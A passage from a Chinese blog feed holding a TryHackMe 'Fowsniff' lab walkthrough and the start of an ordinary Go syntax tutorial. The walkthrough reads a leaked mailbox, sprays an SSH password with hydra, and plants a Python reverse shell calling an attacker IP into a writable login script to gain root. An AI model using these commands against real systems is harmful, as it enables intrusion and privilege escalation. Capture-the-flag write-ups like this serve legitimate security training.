1个帐户有效：<code>seina:scoobydoo2</code>（msf 好慢唉唉唉:( </p><p>登录邮箱查看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.253.104</span> <span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6aadde59584c0b29.png"></p><p>list 发现有两封邮件，查看一下。retr 1 读取第一封</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">Return</span>-Path: &lt;stone<span class="hljs-comment">@fowsniff&gt;</span><br><span class="hljs-comment">X-Original-To: seina@</span>fowsniff<br>Delivered-To: seina<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Received: by fowsniff (Postfix, from userid 1000)</span><br><span class="hljs-comment">        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)</span><br><span class="hljs-comment">To: baksteen@</span>fowsniff, mauer<span class="hljs-comment">@fowsniff, mursten@</span>fowsniff,<br>    mustikka<span class="hljs-comment">@fowsniff, parede@</span>fowsniff, sciana<span class="hljs-comment">@fowsniff, seina@</span>fowsniff,<br>    tegel<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Subject: URGENT! Security EVENT!</span><br><span class="hljs-comment">Message-Id: &lt;20180313185107.0FA3916A@</span>fowsniff&gt;<br><span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">07</span> <span class="hljs-number">-0400</span> (EDT)<br>From: stone<span class="hljs-comment">@fowsniff (stone)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Dear All,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A few days ago, a malicious actor was able to gain entry to</span><br><span class="hljs-comment">our internal email systems. The attacker was able to exploit</span><br><span class="hljs-comment">incorrectly filtered escape characters within our SQL database</span><br><span class="hljs-comment">to access our login credentials. Both the SQL and authentication</span><br><span class="hljs-comment">system used legacy methods that had not been updated in some time.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">We have been instructed to perform a complete internal system</span><br><span class="hljs-comment">overhaul. While the main systems are &quot;in the shop,&quot; we have</span><br><span class="hljs-comment">moved to this isolated, temporary server that has minimal</span><br><span class="hljs-comment">functionality.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This server is capable of sending and receiving emails, but only</span><br><span class="hljs-comment">locally. That means you can only send emails to other users, not</span><br><span class="hljs-comment">to the world wide web. You can, however, access this system via</span><br><span class="hljs-comment">the SSH protocol.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You MUST change this password as soon as possible, and you will do so under my</span><br><span class="hljs-comment">guidance. I saw the leak the attacker posted online, and I must say that your</span><br><span class="hljs-comment">passwords were not very secure.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Come see me in my office at your earliest convenience and we&#x27;ll set it up.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Thanks,</span><br><span class="hljs-comment">A.J Stone</span><br></code></pre></td></tr></table></figure><p>retr 2</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Return</span>-Path: &lt;baksteen@fowsniff&gt;<br>X-Original-<span class="hljs-keyword">To</span>: seina@fowsniff<br>Delivered-<span class="hljs-keyword">To</span>: seina@fowsniff<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">by</span> fowsniff (Postfix, <span class="hljs-keyword">from</span> userid <span class="hljs-number">1004</span>)<br>        id <span class="hljs-number">101</span>CA1AC2; Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">To:</span> seina@fowsniff<br><span class="hljs-symbol">Subject:</span> You missed out!<br>Message-Id: &lt;<span class="hljs-number">20180313185405.101</span>CA1AC2@fowsniff&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">From:</span> baksteen@fowsniff<br><br>Devin,<br><br>You should have seen the brass lay <span class="hljs-keyword">into</span> AJ today!<br>We are going <span class="hljs-keyword">to</span> be talking about this one <span class="hljs-keyword">for</span> a looooong time hahaha.<br>Who knew the regional manager had been <span class="hljs-keyword">in</span> the navy? She was swearing <span class="hljs-built_in">like</span> a sailor!<br><br>I don<span class="hljs-comment">&#x27;t know what kind of pneumonia or something you brought back with</span><br>you <span class="hljs-keyword">from</span> your camping trip, but I think I<span class="hljs-comment">&#x27;m coming down with it myself.</span><br>How <span class="hljs-type">long</span> have you been gone - a week?<br><span class="hljs-keyword">Next</span> time you<span class="hljs-comment">&#x27;re going to get sick and miss the managerial blowout of the century,</span><br>at least keep it <span class="hljs-keyword">to</span> yourself!<br><br>I<span class="hljs-comment">&#x27;m going to head home early and eat some chicken soup.</span><br>I think I just got an email <span class="hljs-keyword">from</span> Stone, too, but it<span class="hljs-comment">&#x27;s probably just some</span><br><span class="hljs-string">&quot;Let me explain the tone of my meeting with management&quot;</span> face-saving mail.<br>I<span class="hljs-comment">&#x27;ll read it when I get back.</span><br><br>Feel better,<br><br>Skyler<br><br><span class="hljs-symbol">PS:</span> Make sure you change your email password.<br>AJ had been telling us <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> that right before Captain Profanity showed up.<br></code></pre></td></tr></table></figure><p>综合来看，我们在第一封邮件里面发现了一句 “<strong>The temporary password for SSH is “<code>S1ck3nBluff+secureshell</code></strong>“”，一个临时密码</p><p>还有很多收件人“<strong>baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,mustikka@fowsniff, parede@fowsniff, sciana@fowsniff,seina@fowsniff,tegel@fowsniff</strong>”，创建一个 sshusers.txt 文件，用 hydra 来确认哪些用户没有改密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -L sshusers<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> S1ck3nBluff+secureshell ssh:<span class="hljs-comment">//10.10.253.104</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/10f2b0c72f5242b6.png"></p><p>由此确认用户 <code>bsksteen</code> 没有修改密码，现在可以直接 ssh 连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> baksteen@<span class="hljs-number">10.10.253.104</span><br></code></pre></td></tr></table></figure><p>连上之后发现 baksteen 属于 <code>users</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">find / -<span class="hljs-keyword">type</span> f -<span class="hljs-keyword">group</span> <span class="hljs-title">users</span> <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6376db1485fae637.png"></p><p>这里还有一个 shell 脚本，<code>/opt/cube/cube.sh</code>，看了一下就是登录时显示的那个图画，但是可以修改，意味着我们可以写反向 shell 了</p><h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><p>将下列 shell 写入 <code>/opt/cube/cube.sh</code> 脚本中保存</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python3 -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.14.96.245&quot;</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>退出重新登录，用 nc 监听弹 shell 的端口（我是用的 WSL，所以我直接用 Windows 的 ncat 监听的）</p><p>发现成功反弹弹了拥有 root 权限的 shell</p><p><img src="https://img.dkdun.cn/v1/2025/12/231d23c335df025c.png"></p><p>成功拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9f930db078e1a62.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-基本语法</title>
    <link href="/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>GoGoGo!</p><span id="more"></span><p>先看一个简单的代码，熟悉一下简单语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>package</strong>：声明当前文件属于哪一个包，入口文件都<strong>必须为 <code>main</code> 包</strong>，入口函数是 main 函数。</p><p><strong>import</strong>：导入关键字，fmt 是导入的包名。</p><p><strong>func</strong>：函数声明关键字。</p><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>在 go 中，程序通过将包链接在一起来构建，go 中导入的最基本单位是一个<strong>包</strong>，不是 <code>.go</code> 文件。包内共享所有变量，常量以及所有定义的类型，而且包名建议小写。</p><h2 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h2><p>go 中控制包内资源可见性有两种方法</p><ol><li>名称大写字母开头，即为<strong>公有</strong></li><li>小写或下划线开头，即为<strong>私有</strong></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">package</span> <span class="hljs-title class_">butt3r</span><br><br><span class="hljs-keyword">const</span> User = <span class="hljs-string">&quot;butt3rf1y&quot;</span><span class="hljs-comment">//公有</span><br><br><span class="hljs-keyword">const</span> passwd = <span class="hljs-number">114514</span><span class="hljs-comment">//私有</span><br></code></pre></td></tr></table></figure><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>导入包就是导入这个包的所有公有的类型&#x2F;变量&#x2F;常量</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> 包名<br></code></pre></td></tr></table></figure><p>导入单个包时</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import <span class="hljs-string">&quot;example&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example2&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时也可以用 <code>&#123;&#125;</code> 括起来</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;example1&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>如果包名重复或比较复杂，可以起一个别名</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br>e <span class="hljs-string">&quot;example&quot;</span><br>e1 <span class="hljs-string">&quot;example1&quot;</span><br><br></code></pre></td></tr></table></figure><p>还有一种匿名导入包，但是匿名导入的包无法使用，一般这么做是为了加载包下的 <code>init</code> 函数，但又不需要包中的类型，比如说注册数据库驱动</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>e <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-literal">_</span> <span class="hljs-string">&quot;mysql-driver&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>导入包后，可以通过 <code>名称.标识符</code> 去访问，比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(example.User)<br>&#125;<br></code></pre></td></tr></table></figure><p>私有类型无法访问，并且 go 不支持循环导入，不管是直接的还是间接的。例如包 A 导入了包 B，包 B 也导入了包 A，这是直接循环导入；包 A 导入了包 C，包 C 导入了包 B，包 B 又导入了包 A，这就是间接的循环导入，存在循环导入的话将会无法通过编译。</p><h2 id="内部包"><a href="#内部包" class="headerlink" title="内部包"></a>内部包</h2><p>go 中一个包内名为 <code>internal</code> 包为内部包，外部包无法访问内部包</p><h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>go 中所有内置关键字</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">break</span>        <span class="hljs-keyword">default</span>      func         <span class="hljs-keyword">interface</span>    <span class="hljs-symbol">select</span><br><span class="hljs-symbol">case</span>         <span class="hljs-symbol">defer</span>        <span class="hljs-symbol">go</span>           <span class="hljs-symbol">map</span>          <span class="hljs-symbol">struct</span><br><span class="hljs-symbol">chan</span>         <span class="hljs-symbol">else</span>         <span class="hljs-symbol">goto</span>         <span class="hljs-symbol">package</span>      <span class="hljs-symbol">switch</span><br><span class="hljs-symbol">const</span>        <span class="hljs-symbol">fallthrough</span>  <span class="hljs-symbol">if</span>           <span class="hljs-symbol">range</span>        <span class="hljs-symbol">type</span><br><span class="hljs-symbol">continue</span>     <span class="hljs-symbol">for</span>          <span class="hljs-symbol">import</span>       <span class="hljs-symbol">return</span>       <span class="hljs-symbol">var</span><br></code></pre></td></tr></table></figure><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>go 语言中支持的运算符号的优先级排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">Precedence    Operator<br>   <span class="hljs-number"> 5 </span>            *  /  %  &lt;&lt;  &gt;&gt;  &amp;  &amp;^<br>   <span class="hljs-number"> 4 </span>            +  -  |  ^<br>   <span class="hljs-number"> 3 </span>            ==  !=  &lt;  &lt;=  &gt;  &gt;=<br>   <span class="hljs-number"> 2 </span>            &amp;&amp;<br>   <span class="hljs-number"> 1 </span>            ||<br></code></pre></td></tr></table></figure><p>go 语言中没有选择将<code>~</code>作为取反运算符，而是复用了<code>^</code>符号，当两个数字使用<code>^</code>时，例如<code>a^b</code>，它就是异或运算符，只对一个数字使用时，例如<code>^a</code>，那么它就是取反运算符。go 也支持增强赋值运算符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> /= <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> &amp;^= <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：go 中没有自增和自减，他们变成了语句 <code>statement</code> ，并且规定了只能位于操作数的后方，所以不用再去纠结 <code>i++</code>和<code>++i</code> 这种不太聪明的问题，但是没有返回值。甚至  <code>a = b++</code> 这种写法是错误的。</p><h1 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h1><h2 id="整型字面量"><a href="#整型字面量" class="headerlink" title="整型字面量"></a>整型字面量</h2><p>允许使用 <code>_</code> 进行数字划分，但是仅仅允许在前缀符号之后和数字之间使用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">24 </span>// <span class="hljs-number">24</span><br><span class="hljs-symbol">024 </span>// <span class="hljs-number">24</span><br><span class="hljs-number">2</span>_4 // <span class="hljs-number">24</span><br><span class="hljs-number">0</span>_2_4 // <span class="hljs-number">24</span><br><span class="hljs-number">10</span>_000 // <span class="hljs-number">10</span>k<br><span class="hljs-number">100</span>_000 // <span class="hljs-number">100</span>k<br><span class="hljs-number">0</span>O24 // <span class="hljs-number">20</span><br><span class="hljs-number">0</span>b00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x0_0 // <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="浮点型字面量"><a href="#浮点型字面量" class="headerlink" title="浮点型字面量"></a>浮点型字面量</h2><p>通过不同前缀可以表达不同进制浮点数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0.<br>72.40<br>072.40       <span class="hljs-string">//</span> == 72.40<br>2.71828<br>1.e+0<br>6.67428e-11<br>1E6<br><span class="hljs-string">.25</span><br><span class="hljs-string">.12345E</span>+5<br>1_5.         <span class="hljs-string">//</span> == 15.0<br>0.15e+0_2    <span class="hljs-string">//</span> == 15.0<br><br>0x1p-2       <span class="hljs-string">//</span> == 0.25<br>0x2.p10      <span class="hljs-string">//</span> == 2048.0<br>0x1.Fp+0     <span class="hljs-string">//</span> == 1.9375<br>0X.8p-0      <span class="hljs-string">//</span> == 0.5<br>0X_1FFFP-16  <span class="hljs-string">//</span> == 0.1249847412109375<br>0x15e-2      <span class="hljs-string">//</span> == 0x15e - 2 <span class="hljs-params">(integer subtraction)</span><br></code></pre></td></tr></table></figure><h2 id="复数字面量"><a href="#复数字面量" class="headerlink" title="复数字面量"></a>复数字面量</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0i<br>0123i         <span class="hljs-string">//</span> == 123i<br>0o123i        <span class="hljs-string">//</span> == 0o123 * 1i == 83i<br>0xabci        <span class="hljs-string">//</span> == 0xabc * 1i == 2748i<br>0.i<br>2.71828i<br>1.e+0i<br>6.67428e-11i<br>1E6i<br><span class="hljs-string">.25i</span><br><span class="hljs-string">.12345E</span>+5i<br>0x1p-2i       <span class="hljs-string">//</span> == 0x1p-2 * 1i == 0.25i<br></code></pre></td></tr></table></figure><h2 id="字符字面量"><a href="#字符字面量" class="headerlink" title="字符字面量"></a>字符字面量</h2><p>字符字面量必须使用单引号括起来 <code>&#39;&#39;</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;a&#x27;<br>&#x27;ä&#x27;<br>&#x27;你&#x27;<br>&#x27;\t&#x27;<br>&#x27;\007&#x27;<br>&#x27;\x07&#x27;<br>&#x27;\xff&#x27;<br>&#x27;\u12e4&#x27;<br>&#x27;\U<span class="hljs-number">00101234</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\a</span>   U+<span class="hljs-number">0007</span> 响铃符号<br><span class="hljs-string">\b</span>   U+<span class="hljs-number">0008</span> 回退符号<br><span class="hljs-string">\f</span>   U+<span class="hljs-number">000</span>C 换页符号<br><span class="hljs-string">\n</span>   U+<span class="hljs-number">000</span>A 换行符号<br><span class="hljs-string">\r</span>   U+<span class="hljs-number">000</span>D 回车符号<br><span class="hljs-string">\t</span>   U+<span class="hljs-number">0009</span> 横向制表符号<br><span class="hljs-string">\v</span>   U+<span class="hljs-number">000</span>B 纵向制表符号<br><span class="hljs-string">\\</span>   U+<span class="hljs-number">005</span>C 反斜杠转义<br><span class="hljs-string">\&#x27;</span>   U+<span class="hljs-number">0027</span> 单引号转义 (该转义仅在字符内有效)<br><span class="hljs-string">\&quot;</span>   U+<span class="hljs-number">0022</span> 双引号转义 (该转义仅在字符串内有效)<br></code></pre></td></tr></table></figure><h2 id="字符串字面量"><a href="#字符串字面量" class="headerlink" title="字符串字面量"></a>字符串字面量</h2><p>字符串字面量必须使用双引号 <code>&quot;&quot;</code> 括起来或者反引号（反引号字符串不允许转义）</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift">`abc`                <span class="hljs-comment">// &quot;abc&quot;</span><br>`\n<br>\n`                  <span class="hljs-comment">// &quot;\\n\n\\n&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&quot;</span>                 <span class="hljs-comment">// `&quot;`</span><br><span class="hljs-string">&quot;kfcvme50!<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;疯狂星期四v我50&quot;</span><br><span class="hljs-string">&quot;\u65e5本\U00008a9e&quot;</span><br><span class="hljs-string">&quot;\xff\u00FF&quot;</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>通过 <code>func</code> 关键字来进行</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>fmt.Println(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>参数类型后置</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">func Hello(<span class="hljs-keyword">name</span> string) &#123;<br>  <span class="hljs-keyword">fmt</span>.Println(<span class="hljs-keyword">name</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>多返回值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">Pos</span><span class="hljs-params">()</span> <span class="hljs-params">()</span> <span class="hljs-params">(x, y float64)</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h1><h2 id="花括号换行"><a href="#花括号换行" class="headerlink" title="花括号换行"></a>花括号换行</h2><p>go 中花括号都不能换行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//正确</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//错误</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> <br>&#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h2><p>go 中代码间隔也有一定的意义，比如说</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>*<span class="hljs-number">4</span> + <span class="hljs-number">5</span>/<span class="hljs-number">1</span>*<span 